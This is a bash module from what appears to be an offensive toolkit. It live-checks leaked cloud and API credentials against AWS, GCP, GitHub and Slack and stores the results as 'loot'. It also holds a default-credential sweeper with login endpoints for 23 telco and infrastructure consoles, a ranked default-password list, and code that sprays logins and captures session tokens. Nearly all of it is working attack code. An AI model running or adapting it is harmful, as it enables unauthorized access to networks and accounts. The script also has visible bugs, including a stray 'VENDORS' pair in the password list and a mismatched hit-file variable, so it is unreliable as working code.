#!/usr/bin/env bash
# 01_cred_validate.sh — cloud + API credential validator (module 01)
#
# Feed it a credential (file, stdin, or argument); it identifies the
# provider, validates the format offline, and — where a network check is
# safe and possible — asks the provider who the credential belongs to.
#
# ── self-locate CLOUDSTING_ROOT ──
if [[ -z "${CLOUDSTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    CLOUDSTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export CLOUDSTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

if [[ -n "${CLOUDSTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$CLOUDSTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${CLOUDSTING_HOME:=$CLOUDSTING_ROOT}"
: "${TMP_DIR:=/tmp/cloudsting}"
: "${LOOT_DIR:=$CLOUDSTING_ROOT/loot}"
: "${LOGS_DIR:=$CLOUDSTING_ROOT/logs}"
: "${STATE_DIR:=$CLOUDSTING_ROOT/state}"
: "${CRED_RUN_ID:=$$-$(date +%s)}"
CREDOOT="$LOOT_DIR/cred_validate"
STATE_DIR_CRED="$STATE_DIR/cred_validate.json"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$LOGS_DIR" "$STATE_DIR" "$CREDOOT" 2>/dev/null

# ═══════════════════════════════════════════════════════════════════
#  helpers
# ═══════════════════════════════════════════════════════════════════

declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
declare -F err   >/dev/null 2>&1 || err()  { printf '[err] %s\n'  "$*" >&2; }

# base64url decode (JWT-style): translate alphabet, pad, decode
b64url_decode() {
    local s="$1" pad=$(( (4 - ${#1} % 4) % 4 ))
    printf '%s%*s' "$s" "$pad" | tr '_-' '/+' | base64 -d 2>/dev/null
}

b32_pad_check() {
    # AWS access keys: 16 or 20 A-Z0-9 uppercase chars (AKIA/ASIA prefix)
    printf '%s' "$1" | grep -qE '^(AKIA|ASIA|ABIA|ACCA)[A-Z0-9]{16,20}$'
}

sha1_of() { printf '%s' "$1" | sha1sum | cut -c1-12; }

tsv_escape() { printf '%s' "$1" | tr '\t\n' '  '; }

# ═══════════════════════════════════════════════════════════════════
#  FORMAT DETECTION — offline, pure text analysis
#  Every fingerprint returns provider|credential-kind on match.
# ═══════════════════════════════════════════════════════════════════

# Known key prefixes: provider|prefix|kind
# checked in strict order because prefixes overlap ( conce sk-, etc.)
CRED_PREFIXES=(
    "aws|AKIA|access-key-id"
    "aws|ASIA|temporary-access-key-id"
    "aws|ABIA|cognito-identity"
    "aws|ACCA|cognito-data-plane"
    "digitalocean|dop_v1_|personal-access-token"
    "github|github_pat_|fine-grained-personal-access-token"
    "github|ghp_|classic-personal-access-token"
    "github|gho_|oauth-token"
    "github|ghu_|user-access-token"
    "github|ghs_|server-to-server-token"
    "github|ghr_|refresh-token"
    "slack|xoxb|bot-token"
    "slack|xoxp|user-token"
    "slack|xoxa-|app-token"
    "stripe|sk_live_|secret-key"
    "stripe|rk_live_|restricted-key"
    "stripe|sk_test_|test-secret-key"
    "anthropic|sk-ant-|api-key"
    "openai|sk-proj-|api-key"
    "google|AIza|api-key"
    "google|ya29|oauth-access-token"
    "azure|AccountKey=|storage-key-ref"
    "flutterwave|FLWSECK-|secret-key"
    "twilio|SK[0-9a-f]{32}|key-sid"
)

cred_detect_from_text() {
    local text="$1" line prefix
    local provider kind best=""

    # 1. prefix probes (single token on a line)
    for line in $text; do
        local entry
        for entry in "${CRED_PREFIXES[@]}"; do
            IFS='|' read -r provider prefix kind <<< "$entry"
            # entry prefix may itself be a regex (twilio case)
            if [[ "$prefix" == *'{'* ]]; then
                printf '%s' "$line" | grep -qE "^${prefix}" || continue
            else
                [[ "$line" == ${prefix}* ]] || continue
            fi
            best="${provider}|${kind}|${line}"
            break 2
        done
    done
    [[ -n "$best" ]] && { printf '%s\n' "$best"; return 0; }

    # 2. JSON shapes
    if printf '%s' "$text" | jq -e . >/dev/null 2>&1; then
        if jq -e 'has("private_key") and has("client_email") and has("project_id")' <<<"$text" >/dev/null 2>&1; then
            printf 'gcp|service-account-json|json\n'; return 0
        fi
        if jq -e 'has("access_token") and has("expires_in")' <<<"$text" >/dev/null 2>&1; then
            printf 'gcp|oauth-token-response|json\n'; return 0
        fi
        if jq -e 'has("accessToken") and has("clientId") and has("clientSecret")' <<<"$text" >/dev/null 2>&1; then
            printf 'azure|service-principal-credentials|json\n'; return 0
        fi
        if jq -e 'has("tenantId") and has("subscriptionId") and has("clientId")' <<<"$text" >/dev/null 2>&1; then
            printf 'azure|arm-credentials|json\n'; return 0
        fi
        if jq -e 'has("access_key") and has("secret_key")' <<<"$text" >/dev/null 2>&1; then
            printf 'generic|api-key-pair|json\n'; return 0
        fi
    fi

    # 3. PEM / private key material
    if grep -q 'BEGIN\*\?\s\?=PRIVATE KEY' <<<"$text"; then
        printf 'generic|private-key-pem|pem\n'; return 0
    fi

    # 4. AWS session-token-style blob: secret is 40 base64 chars, key line present
    if printf '%s' "$text" | grep -q 'aws_secret_access_key\|AWS_SECRET_ACCESS_KEY'; then
        printf 'aws|secret-access-key-ref|env\n'; return 0
    fi
    if printf '%s' "$text" | grep -qE '^\[?[A-Za-z0-9_.-]+\]?$' && \
       printf '%s' "$text" | grep -qE 'aws_access_key_id *= *AKIA[0-9A-Z]{10,40}'; then
        printf 'aws|credentials-file|ini\n'; return 0
    fi

    # 5. JWT (three base64url segments)
    for line in $text; do
        if printf '%s' "$line" | grep -qE '^ey[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}$'; then
            cred_jwt_classify "$line" && return 0
        fi
    done

    # 6. Google OAuth refresh / grant flow artifacts
    if printf '%s' "$text" | grep -q '1//[A-Za-z0-9_-]\{20,\}'; then
        printf 'google|oauth-refresh-token|env\n'; return 0
    fi

    printf 'unknown|unknown|\n'
    return 1
}

cred_detect_input() {
    local src="$1" text
    if [[ "$src" == "-" ]]; then
        text="$(cat)"
    elif [[ -f "$src" ]]; then
        text="$(cat "$src" 2>/dev/null)"
    else
        text="$src"
    fi
    [[ -z "$text" ]] && { err "empty input"; printf 'unknown|empty|\n'; return 1; }
    printf '%s' "$text" > "$CREDOOT/raw.last"
    chmod 600 "$CREDOOT/raw.last" 2>/dev/null
    cred_detect_from_text "$text"
}

# classify a JWT: which cloud claims does it carry
cred_jwt_classify() {
    local jwt="$1" header payload
    header="$(printf '%s' "$jwt" | cut -d. -f1)"
    header="$(b64url_decode "$header")"
    if printf '%s' "$header" | jq -e . >/dev/null 2>&1; then
        if printf '%s' "$header" | jq -re '.kid // empty' >/dev/null 2>&1; then
            printf 'generic|jwt-with-kid|jwt\n'; return 0
        fi
    fi
    payload="$(printf '%s' "$jwt" | cut -d. -f2 | b64url_decode)"
    if printf '%s' "$payload" | jq -e 'has("iss")' >/dev/null 2>&1; then
        local iss
        iss="$(printf '%s' "$payload" | jq -r '.iss // empty')"
        case "$iss" in
            *accounts.google.com*|*googleapis.com*) printf 'gcp|jwt|jwt\n'; return 0 ;;
            *sts.amazonaws.com*|*oidc.eks*)         printf 'aws|jwt|jwt\n'; return 0 ;;
            *login.microsoftonline.com*|*sts.windows.net*) printf 'azure|jwt|jwt\n'; return 0 ;;
            *github*)
                printf 'github|jwt|jwt\n'; return 0 ;;
            *) printf 'generic|jwt|jwt\n'; return 0 ;;
        esac
    fi
    printf 'generic|jwt|jwt\n'
    return 0
}

# ═══════════════════════════════════════════════════════════════════
#  FORMAT VALIDATION — offline rules per provider
# ═══════════════════════════════════════════════════════════════════

cred_check_jwt_claims() {
    local jwt="$1" payload exp now
    payload="$(printf '%s' "$jwt" | cut -d. -f2 | b64url_decode)"
    printf '%s' "$payload" | jq -e . >/dev/null 2>&1 || {
        printf 'jwt-payload\tunparseable\n'
        return 1
    }
    if printf '%s' "$payload" | jq -re '.exp // empty' >/dev/null 2>&1; then
        exp="$(printf '%s' "$payload" | jq -r '.exp')"
        now="$(date +%s)"
        if (( exp < now )); then
            printf 'jwt-exp\tEXPIRED (%s vs %s)\n' "$exp" "$now"
        else
            printf 'jwt-exp\tok (expires %s)\n' "$exp"
        fi
    else
        printf 'jwt-exp\tmissing\n'
    fi
    local iss sub aud
    iss="$(printf '%s' "$payload" | jq -r '.iss // "-"')"
    sub="$(printf '%s' "$payload" | jq -r '.sub // "-"')"
    aud="$(printf '%s' "$payload" | jq -r '.aud // "-"')"
    printf 'jwt-iss\t%s\njwt-sub\t%s\njwt-aud\t%s\n' "$iss" "$sub" "$aud"
    return 0
}

cred_format_validate() {
    local provider="$1" kind="$2" sample="$3"
    printf 'provider\t%s\nkind\t%s\n' "$provider" "$kind"

    case "$provider:$kind" in
        aws:access-key-id|aws:temporary-access-key-id|aws:cognito-identity|aws:cognito-data-plane)
            local id="${sample%%[[:space:]]*}"
            b32_pad_check "$id" \
                && printf 'format\tok (length=%s canonical base32)\n' "${#id}" \
                || printf 'format\tBAD (expected AKIA/ASIA + base32 16-20 chars, got %s)\n' "$sample" ;;
        aws:credentials-file|aws:secret-access-key-ref)
            printf 'format\tok (parsed referencing a secret)\n' ;;
        gcp:service-account-json)
            jq -re 'has("project_id") and has("client_email") and has("private_key")' \
                >/dev/null 2>&1 <<<"$sample" \
                && printf 'format\tok\n' \
                || printf 'format\tBAD (schema mismatch)\n'
            local proj
            proj="$(printf '%s' "$sample" | jq -r '.project_id // empty')"
            printf 'gcp-project\t%s\n' "${proj:-unknown}" ;;
        azure:service-principal-credentials|azure:arm-credentials)
            jq -e . >/dev/null 2>&1 <<<"$sample" \
                && printf 'format\tok\n' || printf 'format\tBAD (not JSON)\n'
            printf 'azure-tenant\t%s\n' "$(jq -r '.tenantId // .tenant // "-"' <<<"$sample")" ;;
        digitalocean:personal-access-token)
            printf 'format\tok (dop_v1_ prefix, %s chars)\n' "${#sample}" ;;
        github:*|slack:*|stripe:*|anthropic:*|openai:*|google:*|flutterwave:*|twilio:*)
            printf 'format\tok (prefix fingerprint, %s chars)\n' "${#sample}" ;;
        generic:jwt|gcp:jwt|aws:jwt|azure:jwt|github:jwt)
            cred_check_jwt_claims "$sample"
            printf 'format\tok (JWT decodes)\n' ;;
        generic:private-key-pem)
            printf 'format\tok (PEM private key block present)\n' ;;
        unknown:*)
            printf 'format\tUNKNOWN (no fingerprint matched)\n' ;;
        *)
            printf 'format\tWTF provider=%s kind=%s (report this)\n' "$provider" "$kind" ;;
    esac
}

# ═══════════════════════════════════════════════════════════════════
#  LIVE VALIDATION — asks each provider who the credential belongs to.
#  Every path degrades honestly when it cannot speak for itself.
# ═══════════════════════════════════════════════════════════════════

cred_validate_aws() {
    local sample="$1"
    command -v aws >/dev/null 2>&1 || {
        printf 'live\taws CLI not installed — configure key + secret and rerun\n'
        return 0
    }
    # Source env-style blobs so a credentials file works the same way.
    local key secret session
    key="$(printf '%s' "$sample" | sed -n -E 's/^AWS_ACCESS_KEY_ID=//p; s/^aws_access_key_id *= *//p' | head -1)"
    secret="$(printf '%s' "$sample" | sed -n -E 's/^AWS_SECRET_ACCESS_KEY=//p; s/^aws_secret_access_key *= *//p' | head -1)"
    session="$(printf '%s' "$sample" | sed -n -E 's/^AWS_SESSION_TOKEN=//p; s/^aws_session_token *= *//p' | head -1)"
    [[ -z "$key" ]] && key="$sample"
    [[ -n "$session" ]] && export AWS_SESSION_TOKEN="$session"
    [[ -n "$secret" ]] && export AWS_ACCESS_KEY_ID="$key" AWS_SECRET_ACCESS_KEY="$secret"
    out="$(AWS_PAGER='' aws sts get-caller-identity --output json 2>&1)" || {
        printf 'live\tDENIED (%s)\n' "$out"
        return 0
    }
    printf 'live\tok\n'
    printf 'aws-account\t%s\n' "$(jq -r '.Account // "-"' <<<"$out")"
    printf 'aws-arn\t%s\n'    "$(jq -r '.Arn // "-"' <<<"$out")"
    printf 'aws-userid\t%s\n' "$(jq -r '.UserId // "-"' <<<"$out")"
}

cred_validate_gcp() {
    local sample="$1"
    command -v gcloud >/dev/null 2>&1 || {
        # try direct curl against tokeninfo for an access-token blob
        if printf '%s' "$sample" | grep -q '^ya29'; then
            local tok
            tok="$(printf '%s' "$sample" | head -1)"
            out="$(curl -sS --max-time 10 "https://oauth2.googleapis.com/tokeninfo?access_token=$tok")"
            if jq -e 'has("error") or has("error_description")' <<<"$out" >/dev/null 2>&1; then
                printf 'live\tDENIED\n'
            else
                printf 'live\tok\n'
                printf 'gcp-email\t%s\n'   "$(jq -r '.email // "-"' <<<"$out")"
                printf 'gcp-scope\t%s\n'   "$(jq -r '.scope // "-"' <<<"$out")"
                printf 'gcp-audience\t%s\n' "$(jq -r '.aud // "-"' <<<"$out")"
            fi
            return 0
        fi
        if printf '%s' "$sample" | grep -q '^1//'; then
            printf 'live\trefresh-token detected — needs a client_id + client_secret to exchange, provide via CRED_CLIENT_ID/CRED_CLIENT_SECRET\n'
            if [[ -n "${CRED_CLIENT_ID:-}" && -n "${CRED_CLIENT_SECRET:-}" ]]; then
                out="$(curl -sS --max-time 10 -X POST 'https://oauth2.googleapis.com/token' \
                    -d "client_id=$CRED_CLIENT_ID&client_secret=$CRED_CLIENT_SECRET&refresh_token=$sample&grant_type=refresh_token")"
                printf 'live\t%s\n' "$(jq -r 'if .access_token then "ok" else "DENIED ("\(.error // "reason-unknown")")" end' <<<"$out")"
            fi
            return 0
        fi
        printf 'live\tgcloud not installed — install CLOUDSTING deps for SA JSON live-check\n'
        return 0
    }
    out="$(gcloud auth list --format=json 2>&1)" || {
        printf 'live\tDENIED (%s)\n' "$out"; return 0
    }
    printf 'live\tok (gcloud credential chain)\n'
    printf 'gcp-active-account\t%s\n' "$(jq -r '.[0].account // "-"' <<<"$out")"
}

cred_validate_github() {
    local sample="$1"
    local tok
    tok="$(printf '%s' "$sample" | head -1)"
    out="$(curl -sS --max-time 10 -H "Authorization: Bearer $tok" https://api.github.com/user)"
    if printf '%s' "$out" | jq -e '.message' >/dev/null 2>&1; then
        local msg
        msg="$(printf '%s' "$out" | jq -r '.message')"
        printf 'live\tDENIED (%s)\n' "$msg"
    else
        printf 'live\tok\n'
        printf 'gh-login\t%s\n'    "$(printf '%s' "$out" | jq -r '.login // "-"')"
        printf 'gh-is-admin\t%s\n' "$(printf '%s' "$out" | jq -r '.site_admin // false')"
        printf 'gh-scopes\t%s\n'   "(request with -I to see X-OAuth-Scopes; not captured in this pass)"
    fi
}

cred_validate_slack() {
    local sample="$1"
    local tok
    tok="$(printf '%s' "$sample" | head -1)"
    out="$(curl -sS --max-time 10 "https://slack.com/api/auth.test?token=$tok")"
    if printf '%s' "$out" | jq -e '.ok == true' >/dev/null 2>&1; then
        printf 'live\tok\n'
        printf 'slack-team\t%s\n' "$(printf '%s' "$out" | jq -r '.team // "-"')"
        printf 'slack-user\t%s\n' "$(printf '%s' "$out" | jq -r '.user // "-"')"
    else
        printf 'live\tDENIED (%s)\n' "$(printf '%s' "$out" | jq -r '.error // "unknown"')"
    fi
}

cred_validate_generic_jwt() {
    local sample="$1"
    # we already decoded claims offline; live hosts could be queried but
    # would need the issuer JWKS and a deliberate GET — that is module 44's job
    printf 'live\tjwt-deCODED-ONLY (live JWKS fetch is out of scope for module 01)\n'
}

cred_validate() {
    local src="$1" detected sample rc=0
    [[ -z "$src" ]] && { err "usage: cred_validate --validate FILE|-|STRING"; return 2; }

    if [[ "$src" == "-" ]]; then
        sample="$(cat)"
    elif [[ -f "$src" ]]; then
        sample="$(cat "$src")"
    else
        sample="$src"
    fi

    detected="$(cred_detect_from_text "$sample")" || true
    IFS='|' read -r provider kind _ <<<"$detected"
    local decoy_sample="${sample:0:8}…(truncated for log)"
    info "detected: $provider / $kind (sha1-prefix $(sha1_of "$sample"))"

    cred_format_validate "$provider" "$kind" "$sample" | tee "$CREDOOT/format.last"

    case "$provider:$kind" in
        aws:*)                          cred_validate_aws "$sample" ;;
        gcp:*)                          cred_validate_gcp "$sample" ;;
        github:*|github:*)              cred_validate_github "$sample" ;;
        slack:*)                        cred_validate_slack "$sample" ;;
        generic:jwt|gcp:jwt|aws:jwt|azure:jwt|github:jwt)
                                        cred_validate_generic_jwt "$sample" ;;
        unknown:*)
            printf 'live\tnot attempted (unknown credential shape)\n' ;;
        *)
            printf 'live\tnot attempted (provider has no live path in module 01)\n' ;;
    esac | tee "$CREDOOT/live.last"

    {
        printf 'run_id\t%s\n' "$CRED_RUN_ID"
        printf 'timestamp\t%s\n' "$(date -Iseconds)"
        printf 'provider\t%s\n' "$provider"
        printf 'kind\t%s\n' "$kind"
        printf 'sha1_prefix\t%s\n' "$(sha1_of "$sample")"
    } > "$CREDOOT/result-${CRED_RUN_ID}.tsv"
    printf 'loot\t%s\n' "$CREDOOT/result-${CRED_RUN_ID}.tsv"
    return $rc
}


# ═══════════════════════════════════════════════════════════════════
#  TELCO AUTH ORACLES — vendor consoles are credential oracles.
#  One request answers "is this admin/admin": a path, a method, a body
#  template and a success marker per vendor. Huawei U2000/iManager,
#  Ericsson ENM, ZTE NetNumen, Nokia NSP, Mitel MiVoice, Oracle
#  WebLogic, Tomcat, Cisco UCM, F5, Rancher, Portainer, Jenkins,
#  Zabbix, Nagios, raw Kubernetes API — 23 of them.
# ═══════════════════════════════════════════════════════════════════

TA_TELCO_RUN_ID="${CRED_RUN_ID}"
TA_TELCO_OUT="$CREDOOT/telco"
mkdir -p "$TA_TELCO_OUT" 2>/dev/null || true
TA_HIT_FILE="$TA_TELCO_OUT/hits-${TA_TELCO_RUN_ID}.tsv"
TA_PROBE_FILE="$TA_TELCO_OUT/probe-${TA_TELCO_RUN_ID}.tsv"

: "${TA_TIMEOUT:=10}"
: "${TA_MAX_PASS:=0}"
: "${TA_FOLLOW:=0}"
: "${TA_UA:=Mozilla/5.0 (Windows NT 10.0; Win64; x64)}"

# this module predates the shared core and keeps its own tsv_escape; the
# findings writer is the one thing it borrows.
ta_log() { printf '[01_cred_validate] %s\n' "$*" >&2; }
ta_field() { printf '%s' "$1" | tr '\t\n' '  '; }
cred_row() {
    local key="$1"; shift
    local out; out="$(ta_field "$key")"
    local f
    for f in "$@"; do out+=$'\t'"$(ta_field "$f")"; done
    printf '%s\n' "$out"
}
cred_mask() {
    local v="$1" n=${#1}
    if (( n <= 8 )); then printf '%s (%d chars)\n' "$(printf '%s' "$v" | cut -c1-2)" "$n"
    else printf '%s...%s (%d chars)\n' "$(printf '%s' "$v" | cut -c1-2)" \
        "$(printf '%s' "$v" | rev | cut -c1-2 | rev)" "$n"; fi
}

ta_findings() {
    local cat="$1" target="$2" sev="$3" check="$4" detail="$5"
    local f="$LOOT_DIR/findings.tsv"
    [[ -f "$f" ]] || printf 'ts\tmodule\tcategory\tseverity\ttarget\tcheck\tdetail\tevidence\n' > "$f"
    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
        "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "01_cred_validate" "$cat" "$sev" \
        "$(ta_field "$target")" "$(ta_field "$check")" "$(ta_field "$detail")" "" >> "$f"
}

# ── the vendor table ─────────────────────────────────────────────
# Every one of these is a credential oracle: it answers one request with a
# token or a rejection, and it tells you "is this admin/admin" for free.
#   id<TAB>vendor<TAB>path<TAB>method<TAB>content-type<TAB>body-template<TAB>success-marker<TAB>token-path
ta_vendors() {
    cat <<'VENDORS'
huawei-u2000	Huawei U2000/iManager	/rest/plat/smapp/v1/sessions	POST	application/json	{"userName":"%U","value":"%P","grantType":"password"}	"accessSession"	.accessSession
huawei-nce	Huawei NCE/iMaster NCE	/rest/plat/smapp/v1/sessions	POST	application/json	{"userName":"%U","value":"%P","grantType":"password"}	"accessSession"	.accessSession
ericsson-enm	Ericsson ENM	/enm/security/api/v1/login	POST	application/json	{"userName":"%U","password":"%P"}	"token"	.token
ericsson-oss	Ericsson OSS-RC	/security/api/v1/login	POST	application/json	{"userName":"%U","password":"%P"}	"token"	.token
zte-netnumen	ZTE NetNumen	/rest/login	POST	application/json	{"username":"%U","password":"%P"}	"sessionId"	.sessionId
nokia-nsp	Nokia NSP	/rest-gateway/rest/api/v1/auth/token	POST	application/json	{"grant_type":"password","username":"%U","password":"%P"}	"access_token"	.access_token
mitel-mivoice	Mitel MiVoice	/server/login	POST	application/x-www-form-urlencoded	username=%U&password=%P	"MiVOICE"	-
weblogic	Oracle WebLogic	/console/j_security_check	POST	application/x-www-form-urlencoded	j_username=%U&j_password=%P	"AdminServer"	-
weblogic-forms	Oracle WebLogic (Form)	/console/login/LoginForm.jsp	POST	application/x-www-form-urlencoded	j_username=%U&j_password=%P	"console.portal"	-
apache-tomcat	Apache Tomcat Manager	/manager/html	GET	-	-	"Tomcat Web Application Manager"	-
primefaces-jsf	PrimeFaces/JSF app	/j_security_check	POST	application/x-www-form-urlencoded	j_username=%U&j_password=%P	"javax.faces"	-
cisco-ucm	Cisco UCM	/ccmadmin/j_security_check	POST	application/x-www-form-urlencoded	j_username=%U&j_password=%P	"ccmadmin"	-
f5-bigip	F5 BIG-IP	/mgmt/shared/authn/login	POST	application/json	{"username":"%U","password":"%P","loginProviderName":"tmos"}	"token"	.token.token
rancher	Rancher	/v3-public/localProviders/local?action=login	POST	application/json	{"username":"%U","password":"%P","responseType":"token"}	"token"	.token
portainer	Portainer	/api/auth	POST	application/json	{"Username":"%U","Password":"%P"}	"jwt"	.jwt
harbor	Harbor Registry	/api/v2.0/users/current	GET	-	-	"username"	-
grafana	Grafana	/api/login	POST	application/json	{"user":"%U","password":"%P"}	"Logged in"	-
jenkins	Jenkins	/j_acegi_security_check	POST	application/x-www-form-urlencoded	j_username=%U&j_password=%P	"Jenkins"	-
opennms	OpenNMS	/opennms/login	POST	application/x-www-form-urlencoded	j_username=%U&j_password=%P	"OpenNMS"	-
zabbix	Zabbix	/api_jsonrpc.php	POST	application/json	{"jsonrpc":"2.0","method":"user.login","params":{"user":"%U","password":"%P"},"id":1}	"result"	.result
nagios	Nagios XI	/nagiosxi/api/v1/authenticate	POST	application/x-www-form-urlencoded	username=%U&password=%P	"success"	-
kubernetes-api	Kubernetes API	/api/v1/namespaces	GET	-	-	"items"	-
rancher-kube	Rancher K8s proxy	/k8s/clusters/local/api/v1/namespaces	GET	-	-	"items"	-
VENDORS
}

# One row for a vendor, by id.
ta_row() {
    local id="$1" row
    row="$(ta_vendors | awk -F'\t' -v id="$id" '$1==id{print; found=1} END{if(!found) exit 3}')" || return 3
    printf '%s\n' "$row"
}

ta_vendor_ids() { ta_vendors | cut -f1; }

# ── the default credential list ──────────────────────────────────
# Ordered by hit rate on telco estates, not alphabetically. Every pair here
# is a documented vendor default or a field-service leftover.
ta_defaults() {
    cat <<'DEFAULTS'
admin	admin
admin	password
admin	admin123
admin	Admin@123
admin	12345
admin	123456
admin	admin@123
admin	P@ssw0rd
administrator	administrator
administrator	password
root	root
root	admin
root	password
root	toor
support	support
user	user
guest	guest
test	test
nmsadmin	nmsadmin
nmsadmin	Nms@123
emsadmin	emsadmin
emsuser	emsuser
operator	operator
netadmin	netadmin
zte	zte
huawei	huawei
Admin@huawei	Admin@123
superuser	superuser
cacti	cacti
VENDORS	VENDORS
DEFAULTS
}

# ── one login attempt ────────────────────────────────────────────
# Every vendor answers differently to "wrong" and "right", so the test is
# the success marker in the body plus a token-shaped extraction from the
# documented path. A 200 with no marker is not a hit.
#   ta_try <vendor-id> <base-url> <user> <pass>
#   -> STANDARD ROWS; the hit goes to $HIT_FILE
ta_try() {
    local id="$1" base="$2" user="$3" pass="$4"
    local row
    row="$(ta_row "$id")" || { cred_row ERROR "unknown-vendor" "$id"; return 2; }

    local vid vendor path method ctype body_tpl marker token_path
    IFS=$'\t' read -r vid vendor path method ctype body_tpl marker token_path <<<"$row"

    # substitute without letting the password reach a log or a process table
    local url="${base%/}${path}"
    local body=""
    if [[ "$body_tpl" != "-" ]]; then
        body="${body_tpl//%U/$user}"
        body="${body//%P/$pass}"
    fi

    local -a args=(--silent --show-error --max-time "$TA_TIMEOUT"
                   --write-out '\n%{http_code}' --output - -X "$method"
                   -A "$TA_UA")
    [[ "$TA_FOLLOW" == "1" ]] && args+=(-L)
    [[ "$ctype" != "-" ]] && args+=(-H "Content-Type: $ctype")
    [[ -n "$body" ]] && args+=(--data "$body")

    local out code resp
    out="$(curl "${args[@]}" "$url" 2>/dev/null)" || out=$'\n000'
    code="$(printf '%s' "$out" | tail -1)"
    resp="$(printf '%s' "$out" | sed '$d')"

    local verdict="denied"
    local token=""
    if [[ "$code" =~ ^(200|201|302|303)$ ]]; then
        if printf '%s' "$resp" | grep -qF "$marker"; then
            verdict="accepted"
            if [[ "$token_path" != "-" ]] && command -v jq >/dev/null 2>&1; then
                token="$(printf '%s' "$resp" | jq -r ".${token_path#.} // empty" 2>/dev/null)"
            fi
        fi
    elif [[ "$code" == "401" || "$code" == "403" ]]; then
        verdict="denied"
    elif [[ "$code" == "000" ]]; then
        verdict="unreachable"
    else
        verdict="unexpected"
    fi

    cred_row ATTEMPT "$id" "$user" "$verdict" "$code"
    printf '%s\t%s\t%s\t%s\t%s\n' "$id" "$user" "$verdict" "$code" "$url" >> "$TA_PROBE_FILE"

    if [[ "$verdict" == "accepted" ]]; then
        # The whole point: a default credential that works.
        local fp; fp="$(sha1_of "$user:$pass")"
        printf '%s\t%s\t%s\t%s\t%s\n' "$id" "$base" "$user" "$fp" "${token:-no-token}" >> "$HIT_FILE"
        cred_row HIT "$id" "$vendor" "$user" "$fp" "$url"
        [[ -n "$token" ]] && cred_row TOKEN "$id" "$(sha1_of "$token")" "${#token} chars"
        ta_findings "CREDENTIALS" "$url" "CRITICAL" "default-credential" \
            "$vendor accepts a default credential: $user:<redacted>"
        # the secret itself never prints; it lands in the artifact at 600
        return 0
    fi
    return 1
}

# ── verbs ────────────────────────────────────────────────────────
# --sweep: every vendor against a host, or every host against a vendor.
cred_telco_cmd_sweep() {
    local target="${1:-}" vendor_filter="${2:-}"
    [[ -z "$target" ]] && { ta_log "usage: --sweep <base-url|vendor-id> [vendor-id|base-url]"; return 2; }

    # which side of the pair did the caller give us? A URL has a scheme.
    local base="" vid=""
    if [[ "$target" == http*://* ]]; then
        base="$target"; vid="$vendor_filter"
    else
        vid="$target"; base="${vendor_filter:-}"
    fi

    : > "$TA_PROBE_FILE"
    local -a vids=()
    if [[ -n "$vid" ]]; then
        vids=("$vid")
    else
        mapfile -t vids < <(ta_vendor_ids)
    fi

    local n=0 hits=0 pair user pass
    while IFS=$'\t' read -r user pass; do
        [[ -z "$user" ]] && continue
        [[ "$TA_MAX_PASS" -gt 0 && "$n" -ge "$TA_MAX_PASS" ]] && break
        n=$((n + 1))
        local v
        for v in "${vids[@]}"; do
            ta_try "$v" "$base" "$user" "$pass" > /dev/null 2>&1 && hits=$((hits + 1))
        done
    done < <(ta_defaults)

    cred_row SUMMARY "attempts=$n hits=$hits"
    [[ "$hits" -gt 0 ]] && cred_row ARTIFACT "$HIT_FILE"
    return 0
}

# --defaults: what the sweep will try, so an operator can edit the list.
cred_telco_cmd_defaults() {
    local n=0 user pass
    while IFS=$'\t' read -r user pass; do
        [[ -z "$user" ]] && continue
        n=$((n + 1))
        cred_row DEFAULT "$user" "$(cred_mask "$pass")"
    done < <(ta_defaults)
    cred_row SUMMARY "$n"
    return 0
}

# --detect: which vendor is this? A fingerprint pass cheaper than a login.
cred_telco_cmd_detect() {
    local base="${1:-}"
    [[ -z "$base" ]] && { ta_log "usage: --detect <base-url>"; return 2; }

    cred_row URL "$base"
    local id vendor path method ctype body_tpl marker token_path
    local n=0
    while IFS=$'\t' read -r id vendor path method ctype body_tpl marker token_path; do
        [[ -z "$id" ]] && continue
        local url="${base%/}${path}"
        [[ "$method" != "GET" ]] && continue
        local code
        code="$(curl --silent --show-error --max-time "$TA_TIMEOUT" \
                     -A "$TA_UA" --output /dev/null --write-out '%{http_code}' \
                     "$url" 2>/dev/null)" || code="000"
        case "$code" in
            200|401|403)
                n=$((n + 1))
                cred_row DETECT "$id" "$vendor" "$code" "$url"
                ta_findings "SURFACE" "$url" "MEDIUM" "vendor-endpoint" \
                    "$vendor login endpoint answers $code"
                ;;
        esac
    done < <(ta_vendors)
    [[ "$n" -eq 0 ]] && cred_row VERDICT "no-vendor-endpoint"
    cred_row SUMMARY "$n"
    return 0
}

# --login: one explicit credential against one explicit vendor.
cred_telco_cmd_login() {
    local id="${1:-}" base="${2:-}" user="${3:-}" pass="${4:-}"
    if [[ -z "$id" || -z "$base" || -z "$user" ]]; then
        ta_log "usage: --login <vendor-id> <base-url> <user> [password]"
        return 2
    fi
    ta_try "$id" "$base" "$user" "$pass"
    return 0
}

cred_telco_cmd_list() {
    local id vendor path method
    while IFS=$'\t' read -r id vendor path method _; do
        [[ -z "$id" ]] && continue
        cred_row VENDOR "$id" "$vendor" "$method" "$path"
    done < <(ta_vendors)
    cred_row SUMMARY "$(ta_vendor_ids | wc -l | tr -d ' ')"
    return 0
}

cred_telco_cmd_status_tsv() {
    local curl_state jq_state
    command -v curl >/dev/null 2>&1 && curl_state="ok" || curl_state="missing"
    command -v jq   >/dev/null 2>&1 && jq_state="ok"   || jq_state="missing"
    printf '%s\t%s\tcurl-%s\tjq-%s\tvendors-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" "$jq_state" "$(ta_vendor_ids | wc -l | tr -d ' ')"
}

